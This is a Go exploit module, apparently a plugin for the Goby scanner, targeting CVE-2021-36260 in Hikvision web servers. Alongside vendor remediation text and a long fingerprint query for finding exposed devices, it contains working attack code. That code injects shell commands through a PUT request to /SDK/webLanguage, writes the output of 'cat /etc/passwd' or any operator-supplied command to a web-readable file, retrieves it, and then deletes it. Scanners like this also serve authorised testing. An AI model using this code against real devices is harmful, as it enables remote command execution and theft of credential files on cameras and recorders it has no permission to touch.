package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hikvision Web Server RCE (CVE-2021-36260)",
    "Description": "<p>Hikvision Web Server is a Web server of China's Hikvision company. Used to parse the agreement and provide services.</p><p>There is a command injection vulnerability in Hikvision Web Server, which stems from insufficient input validation. An attacker can use this vulnerability to initiate a command injection attack by sending a message with a malicious command to gain server permissions.</p>",
    "Impact": "Hikvision Web Server RCE (CVE-2021-36260)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/20210919/\">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/20210919/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Hikvision Web Server",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "Hikvision Web Server 命令注入漏洞（CVE-2021-36260）",
            "Description": "<p>Hikvision Web Server是中国海康威视（Hikvision）公司的一个Web服务器。用于解析协议，提供服务。</p><p>Hikvision Web Server 中存在命令注入漏洞，该漏洞源于输入验证不足。攻击者可利用该漏洞通过发送带有恶意命令的消息来发起命令注入攻击，获取服务器权限。</p>",
            "Impact": "<p>Hikvision Web Server 中存在命令注入漏洞，该漏洞源于输入验证不足。攻击者可利用该漏洞通过发送带有恶意命令的消息来发起命令注入攻击。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/20210919/\">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/20210919/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Hikvision Web Server",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Hikvision Web Server RCE (CVE-2021-36260)",
            "Description": "<p>Hikvision Web Server is a Web server of China's Hikvision company. Used to parse the agreement and provide services.</p><p>There is a command injection vulnerability in Hikvision Web Server, which stems from insufficient input validation. An attacker can use this vulnerability to initiate a command injection attack by sending a message with a malicious command to gain server permissions.</p>",
            "Impact": "Hikvision Web Server RCE (CVE-2021-36260)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/20210919/\">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/20210919/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Hikvision Web Server",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "(header=\"realm=\\\"Hikvision\" || (banner=\"realm=\\\"Hikvision\" && banner!=\"couchdb\" && banner!=\"drupal\") || ((body=\"updateTips\" && body=\"doc/page/login.asp\") && server!=\"NVR Webserver\") || ((body=\"doc/page/login.asp\" && body=\"screen.availWidth,screen.availHeight\") && server!=\"NVR Webserver\") || (header=\"_goaheadwebSessionId\" && header=\"Server: Hikvision-Webs\" && title!=\"ABUS DVR\") || (header=\"Server: DVRDVS-Webs\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (header=\"Server: DNVRS-Webs\" && body!=\"ABUS\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (banner=\"Server: DNVRS-Webs\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\"couchdb\") || banner=\"Hik-B20\" || (body=\"HCNetVideoActiveX.cab\" && header!=\"drupal\") || (body=\"codebase=\\\"../codebase/NewHCNetActiveX.cab\" && header!=\"drupal\") || (body=\"window.location.href = \\\"/doc/page/login.asp?_\" && server=\"App-webs\") || banner=\"Server: StreamSystem4.0\" || (body=\"codebase=\\\"../codebase/NetVideoOCX.cab\" && title=\"NetVideoOCX\") || (body=\"//alert(\\\"The system language is not supported!\\\");\" && header!=\"drupal\") || cert=\"o=Hikvision, ou=IPCamera\" || banner=\"\\xff\\xfd\\x01\\xff\\xfd\\x1f\\xff\\xfd!\\xff\\xfb\\x01\\xff\\xfb\\x03Hik-B20-S login:\" || (banner=\"Hikvision login:\" && protocol=\"telnet\") || (server=\"App-webs/\" && header=\"Content-Length: 481\") || banner=\"dvrdvs login:\" || (protocol=\"telnet\" && banner=\"NetDVRDVS\") || (body=\"classid=\\\"clsid:7B43048F-DA7A-458F-AF35-D825BDBB6816\\\" codebase=\\\"../codebase/NetVideoOCX.cab\" && title!=\"ABUS DVR\" && header!=\"drupal\") || (body=\"classid=\\\"clsid:F030F48F-CD67-45D1-B622-A5D88A7BCFE9\\\" id=\\\"HCNetVideo\" && header!=\"drupal\") || banner=\"192.0.0.64 login:\" || (banner=\"Server: App-webs/\" && cert=\"Subject: o=Product Root CA, ou=IP Camera\") || (banner=\"DVRDVS-Webs\" && cert=\"o=HIKVISION, ou=DVRNVR\") || cert=\"st=zj, l=hz, o=yunwei, ou=hik\" || (protocol=\"rtsp\" && banner=\"Server: hikvision\") || (body=\"/HIKGIS/\" && header!=\"drupal\") || (protocol=\"rtsp\" && banner=\"Server: StreamSystem4.1\") || banner=\"Hikvision company products\" || (body=\"window.location.href = \\\"/doc/page/login.asp?_\\\" + (new Date()).getTime()\" && header=\"Content-Length: 480\") || (body=\"/ui/css/ui.css?version=\\\" + new Date().getTime\" && body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\"\" && body!=\"css/login.css?version=\\\" + new Date()\") || (body=\"var syslanguage= navigator.browserLanguage.toLowerCase()\" && body=\"var szlanguage = sysLanguage.substring(0,2)\") || (body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\">\" && body=\"class=\\\"btn btn-primary login-btn\\\"\") || (body=\"id=\\\"divAnonymous\\\"\" && body=\"id=\\\"divPswStrength\\\"\") || banner=\"hai210E\" || (body=\"<FORM action=\\\"/goform/formCobraLogin\" && header!=\"drupal\") || body=\"去除edge下将数字处理成电话的错误\" || (body=\"SetZeroChanEnlarge(EnlargeInfo);\" && body=\"src=\\\"doc/app.js\" && body=\"GetMovePlaybackTime(szGetTime)\") || (banner=\"Server: MgcServer\" && banner=\"SupportAuth: AES BASE64\")) || (header=\"realm=\\\"Hikvision\" || (banner=\"realm=\\\"Hikvision\" && banner!=\"couchdb\" && banner!=\"drupal\") || ((body=\"updateTips\" && body=\"doc/page/login.asp\") && server!=\"NVR Webserver\") || ((body=\"doc/page/login.asp\" && body=\"screen.availWidth,screen.availHeight\") && server!=\"NVR Webserver\") || (header=\"_goaheadwebSessionId\" && header=\"Server: Hikvision-Webs\" && title!=\"ABUS DVR\") || (header=\"Server: DVRDVS-Webs\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (header=\"Server: DNVRS-Webs\" && body!=\"ABUS\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (banner=\"Server: DNVRS-Webs\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\"couchdb\") || banner=\"Hik-B20\" || (body=\"HCNetVideoActiveX.cab\" && header!=\"drupal\") || (body=\"codebase=\\\"../codebase/NewHCNetActiveX.cab\" && header!=\"drupal\") || (body=\"window.location.href = \\\"/doc/page/login.asp?_\" && server=\"App-webs\") || banner=\"Server: StreamSystem4.0\" || (body=\"codebase=\\\"../codebase/NetVideoOCX.cab\" && title=\"NetVideoOCX\") || (body=\"//alert(\\\"The system language is not supported!\\\");\" && header!=\"drupal\") || cert=\"o=Hikvision, ou=IPCamera\" || banner=\"\\xff\\xfd\\x01\\xff\\xfd\\x1f\\xff\\xfd!\\xff\\xfb\\x01\\xff\\xfb\\x03Hik-B20-S login:\" || (banner=\"Hikvision login:\" && protocol=\"telnet\") || (server=\"App-webs/\" && header=\"Content-Length: 481\") || banner=\"dvrdvs login:\" || (protocol=\"telnet\" && banner=\"NetDVRDVS\") || (body=\"classid=\\\"clsid:7B43048F-DA7A-458F-AF35-D825BDBB6816\\\" codebase=\\\"../codebase/NetVideoOCX.cab\" && title!=\"ABUS DVR\" && header!=\"drupal\") || (body=\"classid=\\\"clsid:F030F48F-CD67-45D1-B622-A5D88A7BCFE9\\\" id=\\\"HCNetVideo\" && header!=\"drupal\") || banner=\"192.0.0.64 login:\" || (banner=\"Server: App-webs/\" && cert=\"Subject: o=Product Root CA, ou=IP Camera\") || (banner=\"DVRDVS-Webs\" && cert=\"o=HIKVISION, ou=DVRNVR\") || cert=\"st=zj, l=hz, o=yunwei, ou=hik\" || (protocol=\"rtsp\" && banner=\"Server: hikvision\") || (body=\"/HIKGIS/\" && header!=\"drupal\") || (protocol=\"rtsp\" && banner=\"Server: StreamSystem4.1\") || banner=\"Hikvision company products\" || (body=\"window.location.href = \\\"/doc/page/login.asp?_\\\" + (new Date()).getTime()\" && header=\"Content-Length: 480\") || (body=\"/ui/css/ui.css?version=\\\" + new Date().getTime\" && body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\"\" && body!=\"css/login.css?version=\\\" + new Date()\") || (body=\"var syslanguage= navigator.browserLanguage.toLowerCase()\" && body=\"var szlanguage = sysLanguage.substring(0,2)\") || (body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\">\" && body=\"class=\\\"btn btn-primary login-btn\\\"\") || (body=\"id=\\\"divAnonymous\\\"\" && body=\"id=\\\"divPswStrength\\\"\") || banner=\"hai210E\" || (body=\"<FORM action=\\\"/goform/formCobraLogin\" && header!=\"drupal\") || body=\"去除edge下将数字处理成电话的错误\" || (body=\"SetZeroChanEnlarge(EnlargeInfo);\" && body=\"src=\\\"doc/app.js\" && body=\"GetMovePlaybackTime(szGetTime)\") || (banner=\"Server: MgcServer\" && banner=\"SupportAuth: AES BASE64\"))",
    "GobyQuery": "(header=\"realm=\\\"Hikvision\" || (banner=\"realm=\\\"Hikvision\" && banner!=\"couchdb\" && banner!=\"drupal\") || ((body=\"updateTips\" && body=\"doc/page/login.asp\") && server!=\"NVR Webserver\") || ((body=\"doc/page/login.asp\" && body=\"screen.availWidth,screen.availHeight\") && server!=\"NVR Webserver\") || (header=\"_goaheadwebSessionId\" && header=\"Server: Hikvision-Webs\" && title!=\"ABUS DVR\") || (header=\"Server: DVRDVS-Webs\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (header=\"Server: DNVRS-Webs\" && body!=\"ABUS\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (banner=\"Server: DNVRS-Webs\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\"couchdb\") || banner=\"Hik-B20\" || (body=\"HCNetVideoActiveX.cab\" && header!=\"drupal\") || (body=\"codebase=\\\"../codebase/NewHCNetActiveX.cab\" && header!=\"drupal\") || (body=\"window.location.href = \\\"/doc/page/login.asp?_\" && server=\"App-webs\") || banner=\"Server: StreamSystem4.0\" || (body=\"codebase=\\\"../codebase/NetVideoOCX.cab\" && title=\"NetVideoOCX\") || (body=\"//alert(\\\"The system language is not supported!\\\");\" && header!=\"drupal\") || cert=\"o=Hikvision, ou=IPCamera\" || banner=\"\\xff\\xfd\\x01\\xff\\xfd\\x1f\\xff\\xfd!\\xff\\xfb\\x01\\xff\\xfb\\x03Hik-B20-S login:\" || (banner=\"Hikvision login:\" && protocol=\"telnet\") || (server=\"App-webs/\" && header=\"Content-Length: 481\") || banner=\"dvrdvs login:\" || (protocol=\"telnet\" && banner=\"NetDVRDVS\") || (body=\"classid=\\\"clsid:7B43048F-DA7A-458F-AF35-D825BDBB6816\\\" codebase=\\\"../codebase/NetVideoOCX.cab\" && title!=\"ABUS DVR\" && header!=\"drupal\") || (body=\"classid=\\\"clsid:F030F48F-CD67-45D1-B622-A5D88A7BCFE9\\\" id=\\\"HCNetVideo\" && header!=\"drupal\") || banner=\"192.0.0.64 login:\" || (banner=\"Server: App-webs/\" && cert=\"Subject: o=Product Root CA, ou=IP Camera\") || (banner=\"DVRDVS-Webs\" && cert=\"o=HIKVISION, ou=DVRNVR\") || cert=\"st=zj, l=hz, o=yunwei, ou=hik\" || (protocol=\"rtsp\" && banner=\"Server: hikvision\") || (body=\"/HIKGIS/\" && header!=\"drupal\") || (protocol=\"rtsp\" && banner=\"Server: StreamSystem4.1\") || banner=\"Hikvision company products\" || (body=\"window.location.href = \\\"/doc/page/login.asp?_\\\" + (new Date()).getTime()\" && header=\"Content-Length: 480\") || (body=\"/ui/css/ui.css?version=\\\" + new Date().getTime\" && body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\"\" && body!=\"css/login.css?version=\\\" + new Date()\") || (body=\"var syslanguage= navigator.browserLanguage.toLowerCase()\" && body=\"var szlanguage = sysLanguage.substring(0,2)\") || (body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\">\" && body=\"class=\\\"btn btn-primary login-btn\\\"\") || (body=\"id=\\\"divAnonymous\\\"\" && body=\"id=\\\"divPswStrength\\\"\") || banner=\"hai210E\" || (body=\"<FORM action=\\\"/goform/formCobraLogin\" && header!=\"drupal\") || body=\"去除edge下将数字处理成电话的错误\" || (body=\"SetZeroChanEnlarge(EnlargeInfo);\" && body=\"src=\\\"doc/app.js\" && body=\"GetMovePlaybackTime(szGetTime)\") || (banner=\"Server: MgcServer\" && banner=\"SupportAuth: AES BASE64\")) || (header=\"realm=\\\"Hikvision\" || (banner=\"realm=\\\"Hikvision\" && banner!=\"couchdb\" && banner!=\"drupal\") || ((body=\"updateTips\" && body=\"doc/page/login.asp\") && server!=\"NVR Webserver\") || ((body=\"doc/page/login.asp\" && body=\"screen.availWidth,screen.availHeight\") && server!=\"NVR Webserver\") || (header=\"_goaheadwebSessionId\" && header=\"Server: Hikvision-Webs\" && title!=\"ABUS DVR\") || (header=\"Server: DVRDVS-Webs\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (header=\"Server: DNVRS-Webs\" && body!=\"ABUS\" && header!=\"couchdb\" && header!=\"drupal\" && body!=\"couchdb\") || (banner=\"Server: DNVRS-Webs\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\"couchdb\") || banner=\"Hik-B20\" || (body=\"HCNetVideoActiveX.cab\" && header!=\"drupal\") || (body=\"codebase=\\\"../codebase/NewHCNetActiveX.cab\" && header!=\"drupal\") || (body=\"window.location.href = \\\"/doc/page/login.asp?_\" && server=\"App-webs\") || banner=\"Server: StreamSystem4.0\" || (body=\"codebase=\\\"../codebase/NetVideoOCX.cab\" && title=\"NetVideoOCX\") || (body=\"//alert(\\\"The system language is not supported!\\\");\" && header!=\"drupal\") || cert=\"o=Hikvision, ou=IPCamera\" || banner=\"\\xff\\xfd\\x01\\xff\\xfd\\x1f\\xff\\xfd!\\xff\\xfb\\x01\\xff\\xfb\\x03Hik-B20-S login:\" || (banner=\"Hikvision login:\" && protocol=\"telnet\") || (server=\"App-webs/\" && header=\"Content-Length: 481\") || banner=\"dvrdvs login:\" || (protocol=\"telnet\" && banner=\"NetDVRDVS\") || (body=\"classid=\\\"clsid:7B43048F-DA7A-458F-AF35-D825BDBB6816\\\" codebase=\\\"../codebase/NetVideoOCX.cab\" && title!=\"ABUS DVR\" && header!=\"drupal\") || (body=\"classid=\\\"clsid:F030F48F-CD67-45D1-B622-A5D88A7BCFE9\\\" id=\\\"HCNetVideo\" && header!=\"drupal\") || banner=\"192.0.0.64 login:\" || (banner=\"Server: App-webs/\" && cert=\"Subject: o=Product Root CA, ou=IP Camera\") || (banner=\"DVRDVS-Webs\" && cert=\"o=HIKVISION, ou=DVRNVR\") || cert=\"st=zj, l=hz, o=yunwei, ou=hik\" || (protocol=\"rtsp\" && banner=\"Server: hikvision\") || (body=\"/HIKGIS/\" && header!=\"drupal\") || (protocol=\"rtsp\" && banner=\"Server: StreamSystem4.1\") || banner=\"Hikvision company products\" || (body=\"window.location.href = \\\"/doc/page/login.asp?_\\\" + (new Date()).getTime()\" && header=\"Content-Length: 480\") || (body=\"/ui/css/ui.css?version=\\\" + new Date().getTime\" && body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\"\" && body!=\"css/login.css?version=\\\" + new Date()\") || (body=\"var syslanguage= navigator.browserLanguage.toLowerCase()\" && body=\"var szlanguage = sysLanguage.substring(0,2)\") || (body=\"ng-bind=\\\"oLan.anonymous\\\" ng-click=\\\"login('anonymous')\\\">\" && body=\"class=\\\"btn btn-primary login-btn\\\"\") || (body=\"id=\\\"divAnonymous\\\"\" && body=\"id=\\\"divPswStrength\\\"\") || banner=\"hai210E\" || (body=\"<FORM action=\\\"/goform/formCobraLogin\" && header!=\"drupal\") || body=\"去除edge下将数字处理成电话的错误\" || (body=\"SetZeroChanEnlarge(EnlargeInfo);\" && body=\"src=\\\"doc/app.js\" && body=\"GetMovePlaybackTime(szGetTime)\") || (banner=\"Server: MgcServer\" && banner=\"SupportAuth: AES BASE64\"))",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.hikvision.com",
    "DisclosureDate": "2021-09-25",
    "References": [
        "https://nosec.org/home/detail/4869.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-36260"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202109-1602"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "createSelect",
            "value": "ls /devinfo,cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Hikvision Web Server"
        ]
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := goutils.RandomHexString(4)
			uri2 := `/SDK/webLanguage`
			cfg2 := httpclient.NewRequestConfig("PUT", uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg2.Data = fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd>webLib/%s)</language>`, Rand1)
			httpclient.DoHttpRequest(u, cfg2)
			uri3 := `/` + Rand1
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
				uri4 := `/SDK/webLanguage`
				cfg4 := httpclient.NewRequestConfig("PUT", uri4)
				cfg4.VerifyTls = false
				cfg4.FollowRedirect = false
				cfg4.Header.Store("X-Requested-With", "XMLHttpRequest")
				cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
				cfg4.Data = fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(rm -f webLib/%s)</language>`, Rand1)
				httpclient.DoHttpRequest(u, cfg4)
				return resp3.StatusCode == 200 && (strings.Contains(resp3.RawBody, "root:") || strings.Contains(resp3.RawBody, "admin:"))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			Rand1 := goutils.RandomHexString(4)
			uri2 := `/SDK/webLanguage`
			cfg2 := httpclient.NewRequestConfig("PUT", uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg2.Data = fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(%s>webLib/%s)</language>`, cmd, Rand1)
			httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			uri3 := `/` + Rand1
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
				uri4 := `/SDK/webLanguage`
				cfg4 := httpclient.NewRequestConfig("PUT", uri4)
				cfg4.VerifyTls = false
				cfg4.FollowRedirect = false
				cfg4.Header.Store("X-Requested-With", "XMLHttpRequest")
				cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
				cfg4.Data = fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(rm -f webLib/%s)</language>`, Rand1)
				httpclient.DoHttpRequest(expResult.HostInfo, cfg4)
				if resp3.StatusCode == 200 {
					expResult.Output = resp3.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
